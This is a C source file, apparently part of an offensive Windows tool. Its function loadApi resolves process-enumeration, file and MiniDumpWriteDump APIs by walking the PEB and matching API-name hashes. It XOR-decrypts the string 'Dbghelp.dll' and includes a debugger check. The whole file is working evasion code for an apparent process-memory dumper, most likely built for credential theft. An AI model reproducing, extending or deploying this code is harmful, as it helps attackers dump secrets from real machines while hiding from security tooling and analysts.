#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include "CalcAPI.h"
#include "LoadAPI.h"
#include "Decryption.h"

BOOL loadApi(API_Call *APICall) {
	Kernel32_API* Kernel32Api = &(APICall->Kernel32Api);
	Dbghelp_API* DbghelpApi = &(APICall->DbghelpApi);

	char DbghelpDllStr[] = "\x07\x01\x22\x2A\x27\x3B\x05\x62\x0A\x02\x21\x64";


	const DWORD hash_kernel32_dll = 0x29cdd463;
	const DWORD hash_LoadLibraryA = 0xe96ce9ef;

	PPEB pPeb = get_peb();
	if (pPeb->BeingDebugged) {
		printf("	[X] Debugger Detected !!!\n");
		//return FALSE;
	}

	LoadLibraryA_F pLoadLibraryA =(LoadLibraryA_F) find_api(pPeb, hash_kernel32_dll, hash_LoadLibraryA);
	if(pLoadLibraryA == NULL)
		return FALSE;

	decryptionRoutine(DbghelpDllStr,12,"\x43\x63\x45\x42\x42\x57\x75\x4C\x6E\x6E\x4D\x64");


	Kernel32Api->OpenProcessF = (OpenProcess_F)find_api(pPeb,hash_kernel32_dll, 0x74f0acb6);
	Kernel32Api->CloseHandleF = (CloseHandle_F)find_api(pPeb,hash_kernel32_dll, 0xfef545);
	Kernel32Api->GetTempPathAF = (GetTempPathA_F)find_api(pPeb,hash_kernel32_dll, 0xb5237431);
	Kernel32Api->CreateToolhelp32SnapshotF = (CreateToolhelp32Snapshot_F)find_api(pPeb,hash_kernel32_dll, 0x9eb60b55);
	Kernel32Api->Process32FirstF = (Process32First_F)find_api(pPeb,hash_kernel32_dll, 0x454fc0f);
	Kernel32Api->Process32NextF = (Process32Next_F)find_api(pPeb,hash_kernel32_dll, 0xa1178452);
	Kernel32Api->CreateFileAF = (CreateFileA_F)find_api(pPeb,hash_kernel32_dll, 0xe84b3a8e);
	if(Kernel32Api->OpenProcessF == NULL ||Kernel32Api->CloseHandleF == NULL ||Kernel32Api->GetTempPathAF == NULL ||Kernel32Api->CreateToolhelp32SnapshotF == NULL ||Kernel32Api->Process32FirstF == NULL ||Kernel32Api->Process32NextF == NULL ||Kernel32Api->CreateFileAF == NULL)
		return FALSE;

	if(pLoadLibraryA(DbghelpDllStr) != NULL) {
		const DWORD DbghelpHash = 0x8f802b95;
		memset(DbghelpDllStr,0x00,12);
		DbghelpApi->MiniDumpWriteDumpF = (MiniDumpWriteDump_F)find_api(pPeb,DbghelpHash, 0x8d228a59);
		if(DbghelpApi->MiniDumpWriteDumpF == NULL)
			return FALSE;
	}else
		return FALSE;

	return TRUE;
}
